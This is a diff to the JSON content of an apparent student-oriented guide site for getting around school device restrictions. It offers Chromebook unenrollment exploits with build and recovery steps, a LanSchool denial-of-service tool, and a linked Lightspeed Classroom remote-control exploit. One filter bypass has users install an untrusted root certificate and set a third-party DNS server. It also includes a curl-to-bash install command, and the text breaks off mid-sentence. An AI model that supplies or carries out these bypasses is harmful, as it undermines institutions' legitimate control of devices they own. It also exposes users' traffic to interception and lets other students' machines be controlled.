@@ -14,7 +14,7 @@
     "welcomePopup": {
       "enabled": true,
       "title": "WARNING",
-      "body": "This guide is not responsible for any trouble you may get in to by using these exploits. These are for educational purposes only and should not be used to cheat in school."
+      "body": "This guide is not responsible for any trouble you may get in to by using these exploits. These are for educational purposes only and should not be used to cheat in school.\n\nIf you created an exploit displayed on this site and would like it taken down, please DM me on discord @Novaro1. \n\nAs always, I recommend joining TitaniumNetwork and CrosBreaker discord servers. They will always show the most recent exploits and info. "
     },
     "showRestart": true,
     "showBack": true,
@@ -55,13 +55,23 @@
     "Chrome OS 1": {
       "id": "Chrome OS 1",
       "title": "Chrome OS 1",
-      "body": "Chrome OS Guide will go here in the future",
+      "body": "Are you comfortable unenrolling your device? (Unenrollment is a more permanent solution to removing hardware restrictions on a device)",
       "warning": "",
       "options": [
         {
           "id": "opt-rrtl89b",
-          "label": "Continue",
-          "nextNodeId": "start",
+          "label": "Yes",
+          "nextNodeId": "step-hnp24vi",
+          "confirmPopup": {
+            "title": "Are you sure?",
+            "body": "",
+            "confirmLabel": "Continue"
+          }
+        },
+        {
+          "id": "opt-0ald8ps",
+          "label": "No",
+          "nextNodeId": "step-n73leey",
           "confirmPopup": null
         }
       ],
@@ -70,13 +80,13 @@
     "Windows 1": {
       "id": "Windows 1",
       "title": "Windows 1",
-      "body": "Windows Guide will go here in the future",
-      "warning": "",
+      "body": "Click a guide",
+      "warning": "I do not own any widows devices to test these exploits. I can only give you what I have found online.",
       "options": [
         {
           "id": "opt-rrtl89b",
-          "label": "Continue",
-          "nextNodeId": "start",
+          "label": "RedSun",
+          "nextNodeId": "step-bbb4bde",
           "confirmPopup": null
         }
       ],
@@ -95,6 +105,186 @@
           "confirmPopup": null
         }
       ],
+      "isEnd": true
+    },
+    "step-hnp24vi": {
+      "id": "step-hnp24vi",
+      "title": "Chromebook Unenrollment",
+      "body": "Welcome to the chromebook unenrollment guide. \n\n---\nBelow are different exploits, utilities, and so on. They are each based on chrome os. They will open a popup when clicked that display the requirements.",
+      "warning": "Unenrollment requires powerwash in almost all scenarios.",
+      "options": [
+        {
+          "id": "opt-n1vogzf",
+          "label": "Install Arch Linux chroot on ChromeOS with GUI support",
+          "nextNodeId": "step-ypkj4dv",
+          "confirmPopup": {
+            "title": "Requirements",
+            "body": "1. Cros shell unblocked\n2. ~16GB of storage\n3. 2GB RAM\n4. Stable internet connection\n5. AC adapter\n6. _CPU Support: x8664 & ARM64 - CPU must be 64-bit\n7. GPU Support: AMD, Intel, NVIDIA, ARM, Mali, Rockchip, Mediatek, Adreno, & Vivanti\n",
+            "confirmLabel": "Continue"
+          }
+        },
+        {
+          "id": "opt-oysnbtq",
+          "label": "Baddieapple",
+          "nextNodeId": "step-0aqy7jp",
+          "confirmPopup": {
+            "title": "Requirements",
+            "body": "Lower than version 143\n\nOnly works on the following boards: nissa, skyrim, guybrush, corsola, brya, rex, cherry, geralt, staryu\n\nGrants code execution in developer mode miniOS after the BadApple patch!",
+            "confirmLabel": "Continue"
+          }
+        }
+      ],
+      "isEnd": true
+    },
+    "step-n73leey": {
+      "id": "step-n73leey",
+      "title": "What type of bypass?",
+      "body": "If you are not attempting unenrollment, there are many other more temporary ways to bypass your restrictions on the device.",
+      "warning": "",
+      "options": [
+        {
+          "id": "opt-pp9dqud",
+          "label": "Chrome OS Webview",
+          "nextNodeId": "step-643lca3",
+          "confirmPopup": null
+        },
+        {
+          "id": "opt-3w1s8ve",
+          "label": "Other General Temp Bypass",
+          "nextNodeId": "step-1zak6jk",
+          "confirmPopup": {
+            "title": "Warning",
+            "body": "These bypasses are usually blocker specific and there is a chance they have been patched, as well as a chance that there is no bypass for your blocker.",
+            "confirmLabel": "Continue"
+          }
+        }
+      ],
+      "isEnd": true
+    },
+    "step-643lca3": {
+      "id": "step-643lca3",
+      "title": "Webview Bypasses",
+      "body": "Webview bypasses use android apps to bypass filters by allowing you to enter an unrestricted browser inside of an app.\n\n---\n# Required steps:\n1. Open your chromebook and sign in\n2. Open the google play store\n3. Click on an option below that contains an app that you have",
+      "warning": "Webview exploits require you to have the google play store with apps, and not all apps have a current webview.",
+      "options": [
+        {
+          "id": "opt-iog3f7z",
+          "label": "I dont have any of these apps",
+          "nextNodeId": "No Supported Exploits",
+          "confirmPopup": null
+        }
+      ],
+      "isEnd": true
+    },
+    "step-1zak6jk": {
+      "id": "step-1zak6jk",
+      "title": "Blocker Specific Bypasses",
+      "body": "Please select your blocker below:",
+      "warning": "",
+      "options": [
+        {
+          "id": "opt-bw7554m",
+          "label": "Fortiguard",
+          "nextNodeId": "step-yhqnke7",
+          "confirmPopup": null
+        },
+        {
+          "id": "opt-j2puaha",
+          "label": "Lightspeed (Worse)",
+          "nextNodeId": "step-raityvr",
+          "confirmPopup": null
+        },
+        {
+          "id": "opt-ez2psn8",
+          "label": "Lanschool",
+          "nextNodeId": "step-c62g7up",
+          "confirmPopup": {
+            "title": "Windows Only Exploit",
+            "body": "",
+            "confirmLabel": "Continue"
+          }
+        },
+        {
+          "id": "opt-0zlfui5",
+          "label": "Any Extension Based Blocker Bypass (Bad)",
+          "nextNodeId": "step-qav2nkm",
+          "confirmPopup": {
+            "title": "ONLY USE THIS AS A LAST RESORT 🙏 🙏 😭 😭",
+            "body": "This is the most skiddy exploit ever",
+            "confirmLabel": "Continue"
+          }
+        },
+        {
+          "id": "opt-2ixbk0t",
+          "label": "Lightspeed (Best)",
+          "nextNodeId": "step-3nrr2nu",
+          "confirmPopup": null
+        }
+      ],
+      "isEnd": true
+    },
+    "step-yhqnke7": {
+      "id": "step-yhqnke7",
+      "title": "Fortiguard Wireguard VPN Bypass",
+      "body": "Exploit found by @crazycrystals in TitaniumNetwork Discord:\n\n1. connect to unrestricted network\n2. start wireguard\n3. DO NOT stop wireguard tunnel here.\n4. go to restricted/school network\n5. the tunnel works.\n\nthis works because they only detect the handshake(?)(?)(?), not sure but I guess it works sure\n\nyou can either hop off of your phone hotspot for two seconds or just connect once at home and have your laptop in sleep mode, keeping the tunnel \"active\"\nusing PersistentKeepAlive will NOT break this, you can leave it enabled please do for your own sanity",
+      "warning": "",
+      "options": [],
+      "isEnd": true
+    },
+    "step-raityvr": {
+      "id": "step-raityvr",
+      "title": "LSDiddy - Lightspeed Classroom Remote Control (CVE-2026-30368)",
+      "body": "Method found by @s.io2 on TitaniumNetwork Discord\n\n# What is this?\nLSDiddy is a remote control exploit in Lightspeed Classroom. It allows a person to perform any action teachers can perform on student computers. For more information, view the full writeup [here](https://www.incognitotgt.me/blog/lightspeed). If you are here for the Lock bypass, simply follow the instructions below and send an unlock command to yourself / another person\n\n# Where are the instructions?\nAll the instructions can be found on the proof of concept repo located [here](https://github.com/truekas/ls-poc). It is quite complex and requires a decent bit of JS knowledge. You must provide source files from the LS Classroom extension. I cannot make a universal version of this because each district and version have their own versions of the files that have hashes hardcoded.\n\nOnce you have succeeded with the POC (let me know if you do!), feel free to expand upon it as much as you wish. My goal of posting this is to make it more known so that Lightspeed wakes up and fixes the exploit so do this while it is still unfixed.\n\n**Share this with your friends, media, and IT department!!**\n*Disclaimer: any mischevious use of this exploit is discouraged and not condoned by me. Any consequences you may receive are your own responsibility.*",
+      "warning": "(SEMI-PATCHED)",
+      "options": [],
+      "isEnd": true
+    },
+    "step-c62g7up": {
+      "id": "step-c62g7up",
+      "title": "DosSchool",
+      "body": "found by @_synaptic_\n on TitaniumNetwork Discord\n### Disables the ability for lanschool helper to communicate with the local server. Does not prevent teachers from taking over your screen or etc.\n#### You need to be able to run exe files or python. You can use galapagos to help with this.\n\n\n1. Go to releases and download the exe or python file and save it to a folder.\n\n2. Go to %appdata%/../Local/Google/Chrome/User Data/Default/Extensions/honjcnefekfnompampcpmcdadibmjhlk\n\nGo to 3a if you see one folder or the file svrproc42 else go to 3b\n\n3a. open the one folder and copy svrproc42 to the same directory you downloaded the tool to earlier.\n\n3b. Check each folder for svrproc42. Once you fidn it copy it to the same directory you downloaded the tool to earlier.\n\n4. open svrproc42 in notepad and note down the number.\n\n5. Launch the tool if its working a window should have opened and stayed open.\n \n6. go to your browser and go to localhost:TheNumberYouSavedEarlier if its showing a white screen repeat step 5 until it throws an error. (You may have to open a ton of these depending on how powerful your hardware is)\n\n7. Enjoy.\n\n###### the exe is compiled with pyinstaller",
+      "warning": "Windows Only",
+      "options": [],
+      "isEnd": true
+    },
+    "step-bbb4bde": {
+      "id": "step-bbb4bde",
+      "title": "RedSun",
+      "body": "[click here](https://github.com/Nightmare-Eclipse/RedSun)",
+      "warning": "Idk what this is but i added it anyways",
+      "options": [],
+      "isEnd": true
+    },
+    "step-qav2nkm": {
+      "id": "step-qav2nkm",
+      "title": "Edging Extensions",
+      "body": "Found by @lordfunion on TitaniumNetwork Discord\n\n---\n1. Powerwash your chromebook.\n2. Set it back up.\n3. Before any extensions install, immediately turn off wifi.\n4. Open chrome, and type the url of the website you want to go to with the wifi still off.\n5. Turn wifi back on, and with just long enough for the page to load, and then turn it back off.\n6. Repeat steps 4 and 5. \n\n*\"I once used this to get into discord on my school computer. It keeps all extensions from being installed. Just make sure not to leave it on for too long, or your filter will be installed. This is a terrible way to get around your filters.\"* -lordfunion",
+      "warning": "\"ONLY USE THIS AS A LAST RESORT 🙏 🙏 😭 😭\" -@lordfunion",
+      "options": [],
+      "isEnd": true
+    },
+    "step-ypkj4dv": {
+      "id": "step-ypkj4dv",
+      "title": "Chard",
+      "body": "Taken from [Chard Github](https://github.com/shadowed1/Chard/blob/main/README.md):\n---\nlogo\n\nlogo\n\n\nHow to Install:\n\n1.) For ChromeOS, and most Linux Distros, press ctrl-alt-t, open a crosh shell and copy paste:\n\nbash <(curl -s \"https://raw.githubusercontent.com/shadowed1/Chard/main/bin/chard_download?$(date +%s)\")\n\n2.) Choose your distro:\nOption 1 is Arch - Supports Steam, Heroic, Flatpak, and is the recommended option for most users.\nOption 2 is Gentoo - Tailored for ChromeOS development. Run binaries + toolchain in ChromeOS.\n\n3.) For ChromeOS, please use VT-2 to proceed. CTRL-ALT-REFRESH enters VT-2. CTRL-ALT-BACK returns to ChromeOS.\n\nTo login, type chronos and run these three commands on their own:\ncd\nsudo mv Chard_Installer /usr/local\nsudo bash /usr/local/Chard_Installer\n\nFollow the instruction on screen. CTRL-ALT-BACK returns back to ChromeOS. Sleep is recommended to be disabled while installing.\n\nOnce install is finished in VT-2, press CTRL-D to log out and log back in as chronos. Type cr or chard root to start.\n\nReturn back to ChromeOS shell, and xfce4-terminal should appear. Run apps through there, or through the app launcher if Crostini is installed.\n\nRunning chard directly in ChromeOS shell and having it start automatically on boot is possible using this tool:\n\nEnabling sudo in ChromeOS shell natively using minijail LD_PRELOAD:\nhttps://github.com/shadowed1/sudoCrosh\n\nAbout Chard (Chrome-Arch Development):\nChard is a chroot (change root) that is Arch or Gentoo Linux.\nSafely lives inside an existing ChromeOS or Linux install without prepending its paths to the system.\n\nOpen Source and free forever.\nAutomated rolling-release installer will build everything needed with full hardware detection.\nRun Linux Apps with GUI support natively inside ChromeOS with GPU acceleration!*\nAudio support over Bluetooth, USB, 3.5mm, and internal speakers with CRAS + pulse virtualization.\nSupports Flatpak, Steam, Heroic, Wine, and even Mouse Capture emulation for first person games.\nChard is in development. Bug reports, suggestions, and ideas are greatly appreciated.\nCan be safely uninstalled at anytime without altering our ChromeOS install!\n\nExamples:\n\nSteam + Game Support:\n\nlogo\n\n\nFirefox:\n\nlogo\n\n\nQEMU running VMs:\n\nlogo\n\n\nMinecraft Java + Prism Launcher:\n\nlogo\n\n\nBrave, Codium, Thunar, VLC, xfce4:\n\nlogo\n\n\nOBS:\n\nlogo\n\n\nLibreOffice\n\nlogo\n\n\nGIMP\n\nlogo\n\n\nNow with Icon Support!\n\nlogo\n\n\nFeatures:\n\nChard auto-detects the Host's hardware and builds Arch or Gentoo + psuedo-Kernel automatically.\nIncludes ability to resume installer if interrupted; even if system shuts down.\n\nSupports running a vast array of apps and games (including Wine and Proton).\nControl app volume with ChromeOS volume controls.\n\nSupports native mouse capture/lock for games!\nGreatly exceeds Crostini performance and can achieve superior performance to Borealis (RIP) with significantly lower memory overhead.\nUSB + Bluetooth controller support for games.\n\nSemi-intelligent CPU task scheduler for building packages.\nChromeOS' Downloads folder is shared when entering Chard Root, allowing for fast file sharing.\n\nIncludes most compiling tools as a basic toolchain.\nUses Sommelier to communicate with ChromeOS' window management and support Desktop Environments, Apps, Games, and more.\n\nRuns GUI apps with full GPU acceleration including audio support for Chromebooks; including HDMI audio out.\nNative full screen support, multi-monitor support, and supports ChromeOS window managment gestures.\n\nDoes not require removing files and includes an uninstaller script to clean up after itself.\nWhen Installer finishes or exits a log file, 'chariot.log', is created for debugging.\n\nCan run certain apps directly from Chard in the Host OS (testing ChromeOS only).\nExtremely resource light; RAM usage is below 100MB footprint.\n\nSupports mounting external drives and Android devices. Connect prior to entering Chard.\nPatches and Builds Sommelier with mouse capture + icon support.\n\nExports bindfs to ChromeOS shell, bypassing noexec mount on external drives, enabling Steam to use external drives for Chard!\nImplements ChromeOS' native icon system using Crostini as a Bridge.\n\nRequirements:\n\nPlease do not install without a USB recovery as this is under rapid development, mistakes happen, and bugs will exist!\n\nRequires 16GB of storage, 2GB of RAM, and an internet connection.\nCPU Support: x86_64 & ARM64 - CPU must be 64-bit\nGPU Support: AMD, Intel, NVIDIA, ARM, Mali, Rockchip, Mediatek, Adreno, & Vivanti\n\nRequires Developer Mode if on ChromeOS.\nUntested with Brunch Toolchain, Chromebrew, and dev_install; but Chard is independent of these tools.\n\nChromebooks with 8GB of RAM and 8+ threads can build Chard in 20-60 minutes. Gentoo install takes longer.\nLower end Chromebooks (2-4 thread Intel, Mediatek 500 series, and older) can expect much longer install times.\n\nChard will use Pacman or Emerge to build:\nMake\nCMake\nCurl with OpenSSL\nGCC\nPython + Pip\nGit\nFile + LDD\nCMake\nPerl\nMeson\nNinja\nRust\nRuby\nOpenSSL\nLLVM\nClang\nMesa\nVulkan + Vulkan Tools\nSommelier\nWayland\nX11\nXFCE4\nVLC\nKDE Plasma\nBrave Browser\nFlatpak\nxarchiver\nGedit\nCodium\nGIMP\nLibreOffice\nThunar\nGParted\nUNetBootin\nQEMU with VM support\nPrism Launcher + Minecraft Java\nOBS with Game Capture, Recording, and Streaming support\nHeroic Game Launcher\nSteam\nFirefox\nSober\nAnd too many to test.\nCommands (Some not listed)\nIn ChromeOS:\n\nchard root or cr -- Enter Chard Root with Sommelier Xwayland GPU acceleration with OpenGL,Vulkan, GUI, mouse capture, icons, and audio support.\nchard safe or cs -- Enter Chard Root without GUI support -- Useful debugging.\nchard unmount or cu -- Force chard to unmount as if exiting (force kill).\nautoclicker <clicks-per-second> -- Run an autoclicker script in ChromeOS!\nchard reinstall -- Option 1 for fast reinstall (does not remove). Option 2 is a full reinstall (removes Chard).\nchard uninstall -- Remove Chard. Refresh shell to remove .bashrc entries.\nchard help -- Show help examples.\nchard chariot or chariot -- Chard's companion tool for setting itself up with a checkpoint system.\nchardonnay -- Launch Sommelier in ChromeOS natively (Gentoo only -- WIP).\nchard version -- Check for updates.\nchard_mount -- Tell chard to mount an external drive.\nchard_unmount -- Tell chard to umount an external drive.\nchard_mtp_mount -- Tell chard to mount an Android device that is connected.\nchard_mtp_unmount -- Tell chard to unmount the Android device.\nrainbow -- Enable a rainbow shell in ChromeOS. (Fun extra)\n\nInside Chard Root\n\nSMRT or SMRT <1-100> -- For compiling - auto allocate threads or specify in % how many threads you want to allocate.\nchard_scale display 1.5 -- Set display scaling to 1.5X scaling.\nchard_scale cursor 64 -- Set cursor to 64px.\nRefresh a new shell after adjusting scaling.\nPrepend wx to an app to try wayland and x11 if unsure.\nchard_mount to mount a USB device (ignores SSD and USB devices) for UNetBootin.\nchard_unmount or exit to unmount the device.\nPrepend root to an app that requires user namespace creation and it might work.\nchariot 144 -- Resume on checkpoint 144 and continue until Chariot finishes.\nchariot -s 90 -- Resume on checkpoint 90 and exit after finishing that specific checkpoint.\nchard_debug -- List Chard's environmental variables in alphabetical order with colors.\nexit -- Leave Chard Root\nflatpak override --user --nosocket=wayland org.app.Appname -- Example for Flatpak troubleshooting\n\nHow to use:\nAfter installer finishes, open a new ChromeOS shell via crosh shell to continue.\nType in cr or chard_root to enter Chard Chroot with Sommelier support.\nWhen running sudo, use sudo -E to preserve environmental variables.\nflatpak override --user --nosocket=wayland app.Appname Might be needed for flatpak.\nWhen running GParted, make sure to unmount the device in ChromeOS first; otherwise you will need to re-run GParted command.\nstartxfce4 launches a taskbar + app drawer. Right click -> panel -> panel preferences -> uncheck lock and click dots on the sides to drag around.\nCreate a launcher in items which then allows for custom app shortcuts.\nQEMU Example:\n\n\n# Download .iso. I use chrome browser and download iso to my chromeos downloads folder.\n# Inside chard, I run:\nqemu-img create -f qcow2 ~/win10.qcow2 40G # to create a 40GB disk image called win10 inside chard's home folder. \n# Install Windows:\nchard_qemu -m 4G -cpu host -smp 4 -machine type=q35,accel=kvm -drive file=~/win10.qcow2,format=qcow2 -cdrom ~/user/MyFiles/Downloads/Win10_22H2_English_x64v1.iso -display sdl,gl=on -boot d -name \"Win10\"\n# After it finishes, close and re-launch without  cdrom:\n# I disconnect from internet here to skip internet login prompt (enable function keys in chromeos settings to active shift + f10 in windows 10)\nchard_qemu -m 4G -cpu host -smp 4 -machine type=q35,accel=kvm -drive file=~/win10.qcow2,if=virtio,cache=writeback,format=qcow2,discard=unmap -vga qxl -display sdl -audiodev pa,id=snd0 -device ich9-intel-hda -device hda-output,audiodev=snd0 -name \"Win10\"\n\n# Above command allocated 4GB of RAM and 4 cpu cores\n# Reconnect to internet after it is set up.\n\nMore QEMU documentation:\nhttps://sysguides.com/install-windows-11-on-kvm#18-add-a-tpm-device-for-windows-requirements\n\n\nUse pavucontrol for volume mixer if needed.\n\nstartxfce4 to launch a basic app launcher shelf that can be adjusted.\nDo not exit a Chard shell if you have other ones open. Append & at end of an app to run more apps in same shell.\n\nKnown Issues - Some of these issues might not be easily fixed:\nChard Arch cannot run multiple chard root shells simultaneously (use xfce4's terminal app)\n*Mediatek GPU support is currently being worked on (hard!) - ARM64 is software rendering only for now.\n\nEntering Chard Root with Sommelier support will generate some harmless errors.\nXbox Series X controller not working with bluetooth.\n\nExiting Chard closes all running apps inside Chard, so please save your work before exiting!\nLXC and VM support is not fully implemented.\n\nSteam often work best with Proton 10.05 (as of March 31st, 2026)\nSucrose users can launch Chard with sudo chard root. Sucrose users should uninstall Chard with VT-2.\n\nChangelog:\n0.01: Initial Release\n\n0.02: Added Wayland or X script. Prepend wx to an app if it cannot find display :0. Added header install command for Linux Kernel. Cleaned up Sommelier tmp directory. Added chard_mount and chard_unmount commands. Enabled KVM kernel flag. Added GParted, UNetBootin and QEMU support. QEMU will use KVM + OpenGL for excellent performance!Now we can format USB's with nearly all file systems and create bootable media in ChromeOS!\n\n0.03: Added Arch Linux support for 10-30x faster install time. Added Steam support (139 only), added native volume controls for Arch.\n\n0.04: Updated to include Steam and Flatpak support for ChromeOS 141+. Chard Arch gets SMRT support\n\n0.05: Isolated Chard forked bubblewrap so other apps will use regular bubblewrap. Added chard unmount command. xfce4 now starts with CHard Arch. Fixed minor bugs.\n\n0.06: Fixed GPU error popup in Mediatek GPU's. (still working on acceleration), Added Firefox support, added SMRT support for yay, fixed Minecraft audio support.\n\n0.07: Fixed audio for ARM64. Fixed wayland crash when launching Brave. Moved prismlauncher to its own wrapper. Added wrapper updates to reinstaller. Fixed version command.\n\n0.08: Added Pipewire config creation script. Implemented pipewire with native ChromeOS socket support. Cleaned up unmount procedure. Fixed occasional internet loss issue when asleep. Fixed Steam to run as User for ChromeOS 140+. Added extra dark theme support. Added volume controls for pulseaudio using chardwire.\n\n0.09: Fixed Wayland crash issue due to Brave alias.\n\n0.10: Fixed Steam local files window from not expanding. Fixed Steam games having flickering lines bug when paired with multiple display + Freesync.\n\n0.11: Significantly improved Pipewire support.\n\n0.12: Downgrade Mesa for Intel iGPU's to fix Vulkan.\n\n0.13: Created custom virtual pulseaudio implementation for simultaneous audio stream support. Added Pulseaudio support.\n\n0.14: Greatly increased amount of commands able to run outside of chroot. Created chard_preload generation script. Added specific ways to run chariot checkpoints. Created Chardonnay script to run sommelier and Xwayland natively in ChromeOS. Added HDMI, 3.5mm, Bluetooth and mute toggle support for Chard Audio controls (chardwire). Added Steam GPU detection script.\n\n0.15: Rolled back LD_PRELOAD changes and removed Chardonnay for Chard Arch. Avoids confusion and Gentoo will be far more capable here. Fixed stale audio download links.\n\n0.16: Fixed slow unmount issues and minor issues\n\n0.17: Added external drive + SD card support. Fixed eselect issue on Chard Gentoo. Fixed minor typos.\n\n0.18: Added ChromeOS_PowerControl GUI support. Fixed minor typos.\n\n0.19: Added autoclicker script. Can be run outside or inside chroot. Fixed powercontrol-gui launching in foreground. Improved chard_flatpak wrapper. Fixed linux_api_headers error on Arch when upgrading. \n\n0.20: Enabled Firefox audio. Significantly improved Flatpak support; including Sober support! Added uname spoofer, prerequisites for Chard Lite, removed bloatware from chariot, and added cleanup commands for Chard Arch post-install.\n\n0.21: Added virtm. This enables virtual touchscreen mouse; enabling chromebooks with touchscreens to use emulated mouse capture. Run virtm prior to launching app.\n\n0.22: Further improved Firefox support to enable GPU accleration with audio support. Added resolv.conf copy during reinstall - Thanks to DennyL for reporting. Added cleanup script for Chard Arch. Added pacman update cleaner and improved GPU detection script for chariot\n\n0.23: Implemented Arch Linux package retry script for chariot. Fixed flatpak wrapper that causes /var/lib error. Fixed Arch Linux user id error for ARM64. Added safety guardrails to installer when removing Chard. Fixed audio loss issue on Arch for ARM64 on ChromeOS 144.\n\n0.24: Updated virtm to support USB mice, and prioritize them over touchpad. This enables touchpad to function normally, while a USB mouse becomes a virtual touchscreen to enable spinning around in 3D environments. Fixed dbus address error. Fixed Steam black screen on first time log in with GPU acceleration enabled for web views.\n\n0.25: Added support for ChromeOS 104. Added chard_sort command for Arch to sort packages by size.\n\n0.26: Fixed Chard Gentoo emerge issues during installer. Added gles2 USE flags. Replaced chronos with $CHARD_USER variable when creating chroot. Added $CHARD_ROOT environmental variable detection in the installer to auto-fill existing install path rather than rely on default only. Fixed $LD_LIBRARY_PATH and $PATH duplication errors. Added additional sbin paths and dynamic /opt/*/bin path detection for Chard Arch. Added thunar to be default file manager in .bashrc. Fixed VLC for Chard Arch on new installs. Added .$USERrc file being sourced by Chard's .bashrc; allowing additional .bashrc entries without overwriting on reinstall.\n\n0.27: Altered some group ID's to match ChromeOS'. Improved non-ChromeOS support. Added sanitization safeguard to .bashrc on uninstall. Added required sys-apps/shadow dependency for coreutils on Gentoo. Fixed typo for installing Vulkan on Chard Arch on Virtual Machines. Fixed .bashrc thunar bug causing shell to hang. Fixed Steam not opening Thunar when opening files. Added xfce4 dark theme to be autoapplied during installer. Added Language checker to no longer auto-apply English and instead use ChromeOS'. Patched Mesa for Intel iGPU's to re-enable Vulkan on ChromeOS with chard_mesa.\n\n0.28: Added bindfs to chard_mount, bypassing noexec limitation for external drives. This enables Steam to use external drives. Added Shortcut and Icon support for Chard using a VM as an app launcher.\n\n0.29: Patched Color Inversion bug on ChromeOS 145 ARM64 for Chard Arch and Chard Gentoo. Fixed Bindfs from being properly called on chard_mount. Enabled microphone support. Equalized pulseaudio and ALSA volume.\n\n0.30: Native mouse capture achieved. Thanks to Days for finding how to actually enable that. To use mouse capture, launch chard using \"cg\" or \"chard game\". App Icons will not be enabled in this mode, but that will be worked on soon.\n\n0.31: Mouse capture support with app icons enabled. Removed \"cg\" or \"chard game\" since it is no longer needed. Integrated sommelier patch logic for \"chard_sommelier_patch\" to enable mouse capture on all devices.\n\n0.32: Patched default.pa to bypass unload-module module-udev-detect limitation. Added back \"cg\" or \"chard game\" due to mouse capture breaking right click and menu interactions on certain apps.\n\n0.33: Added chard_startup command. Chard can now start on boot! Implemented smarter detection for running scripts in incorrect locations.\n\n0.34: Added right click + context menu support for org.chromium.arc. Forked sommelier to own repo due to the amount of edits made. Re-removed \"chard game\" or \"cg\" due to fixing right click issue. Added additional cleanup procedures with new chard startup service. Added chard_qemu wrapper. Updated chard version command to show changelog. Increased startup .conf wait timer.\n\n0.35: Added stop, startup command for chard_bridge_daemon. Added chard_shortcut_daemon to auto-sync icons and shortcuts. Added 3rd option in Reinstall for chard_startup command. Cleaned up exiting Reinstaller. Added ability for chard_bridge_daemon to automatically install and run in Crostini.\n\n0.36: Fixed bugs with chard_mesa and now relying on Steam's GPU drivers (again). Added vulkan_tester script. Improved Flatpak to now support running far more apps. Improved OBS support to now record + stream Vulkan. Added pacman easter egg. Updated Dowmloader instructions. Removing brave, prismlauncher, and rust from chariot to reduce Arch down to 11GB!. \n\n0.37: Added ChromeOS 103 support. Thanks to gd_minecraft_programmer for creating that syntax. Fixed chard_bridge_daemon not working on some devices. Added chard_timezone_daemon to keep Chard's timezone synced with ChromeOS'. Added /opt to paths. Added \"chard log\" command to run in Host shell to compress a log to our Downloads folder.\n\n0.38: Downgrading Flatpak to fix it. The recent patch made it incompatible with Chard. Added Sober wrapper to automatically fix text issue. Added dbus-launch initialization on startup to fix Thunar not opening properly. Attempting to fix language not being properly set on fresh install.\n\n\n\nAcknowledgements - This project would not exist without the help and support from the ChromeOS community.\nGoogle - Ending official Steam support gave me motivation to learn to run Linux apps inside ChromeOS.\nTerry Stormchaser - Spending time testing Borealis alternatives, testing Chard + reporting bugs, and providing ideas.\nDennyL - Testing Chard, reporting bugs, and making suggestions.\nSaragon - Providing documentation and suggestions.\nZhil - Sending documentation for XFCE4 theme ideas.\nSebanc - Helping me move from Gentoo to Arch and enabling audio for Arch.\ndays - Helping fix audio issues with Wine, chard_garcon, enabled mouse capture/lock, isolating Steam Remote Play issues, and more.\nWeirdTreeThing - Help with further supporting pipewire support with their vast audio knowledge. Great ideas for ARM64 GPU acceleration.\nC0d1ngR4bb1t - Created and tested syntax for external USB support.\ngd_minecraft_programmer - Created and tested syntax to support ChromeOS 103 and older.\nnobody067481 - Found bugs with installer and tested a lot of emulators.\nDarkDonkey - Testing QEMU and working on improving performance.\nQuince - Recommending GUI apps that work with Chard.",
+      "warning": "",
+      "options": [],
+      "isEnd": true
+    },
+    "step-3nrr2nu": {
+      "id": "step-3nrr2nu",
+      "title": "LIDNS, Best extension bypass for Lightspeed filter",
+      "body": "What is this?\n\nLIDNS tricks the Lightspeed filter extension on your Chromebook into unblocking every site you visit. It also caches the sites you visit so they stay unblocked even off the DNS, meaning it works on Wi-Fis where you can't change the DNS. And somehow (honestly not totally sure why) it also unblocks network-level blocking for sites too.\n\nWhat you'll need\n\nA Chromebook, and a home Wi-Fi or hotspot to set LIDNS up on. It needs to be a network where you can change the DNS settings.\n\nStep 1: Download the Certificate\n\nChrome needs this to trust the server's connection. Without it you'll just get a cert error and nothing will work.\n\nDownload network-cert.crt: https://drive.google.com/file/d/1EyrxYM5AwYXIr7ohF9maJMbLHgDYR3P6/view?usp=sharing\n\n\nStep 2: Import the Certificate\n\nGo to chrome://certificate-manager/localcerts/usercerts\nClick the Import button next to Trusted Certificates\nSelect network-cert.crt\nClick Open\n\n\nStep 3: Change DNS Settings\n\nHit the Search key and open Settings\nGo to Network, click your Wi-Fi network twice to open its details\nScroll to the Network tab\nSelect Custom name servers\nPut 192.227.130.71 in the first box, leave the rest as 0.0.0.0\nGo to chrome://restart, then test if things are being unblocked by visiting coolmathgames.com\n\nOnly needs to be set once per network.\n\nStep 4: Pre-warm the Cache\n\nThis step caches sites so they stay unblocked on school Wi-Fi, even when you're not on your home network or hotspot.\n\nOpen the Prewarm Tool: https://lsrelay-config-production.s3.amazonaws.com/prewarm\nLook at the bottom and make sure it says Extension Verified, then pick how many websites you want (25k is a good amount) and click Start\nWhen it's done, switch to your school network\nGo to chrome://restart to lock it in\n\nGo to https://lidns.xyz/ please for the full setup with frq and what to do if it stops working, also check out https://github.com/Dylanthedabber/LIDNS for the source.\n\nmade by Sm0keSkreen!",
+      "warning": "",
+      "options": [],
+      "isEnd": true
+    },
+    "step-0aqy7jp": {
+      "id": "step-0aqy7jp",
+      "title": "BaddieApple",
+      "body": "Taken from BaddieApple [Github](https://github.com/crosbreaker/baddieapple)\n---\nbaddieapple\nbaddieapple allows code execution in developer mode recovery on kv5 and kv6 v3 disk layout Chromebooks, similar to sh1mmer but for keyrolled devices. This bypasses the BadApple patch.\n\nSupport\nIf you need any kind of support, please join our discord server for help\n\nWhy is this useful?\nAt the time of me writing this, this can be used for the following: Quicksilver (unenrollment up to R143), Recover to any version, br0ker (unenrollment up to R133), daub, appleboot, unkeyroll (only works if write protect is ALREADY disabled), mrchromebox script and pencil sharpener (not recommended).\n\nCaution\n\nThis exploit is patchecd on R143 via c/6839636\n\nThis exploit only works on the following boards: nissa, skyrim, guybrush, corsola, brya, rex, cherry, geralt, staryu\n\nHow to use\nYou will need:\n\nA USB drive or SD card (8 GB or larger)\nSomething to flash the image (dd, rufus, chromebook recovery utility, etc.)\nInstructions to create a image:\n\ngit clone https://github.com/crosbreaker/baddieapple.git\ncd baddieapple\nsudo ./builder_baddieapple.sh <board> <OPTIONAL:version (default is 142 if unset)>\nNOTE: If this version doesn't work for you, check out no_minios_prebuilt.sh. You can also use this if you do not trust the extracted miniOS versions hosted on this repository. However, there can't be any modifications made due to miniOS being signed so it doesn't make much of a difference ethier way.\n\nOn Chromebook usage instructions:\nRecover to the image outputted by the program\nEnter developer mode with ESC + REFRESH + POWER and CTRL + D\nWhen you reach the block screen, press ESC + REFRESH + POWER again\nSelect Internet Recovery\nWhen miniOS loads in, press CTRL + ALT + F3 (open VT3)\nWhy does this work?\nGoogle forgot to increase the miniOS kernver (yes, it is seperate from the normal kernver) after pushing the original BadApple patch. Allowing us to downgrade miniOS using a modified recovery image, as recovery images don't 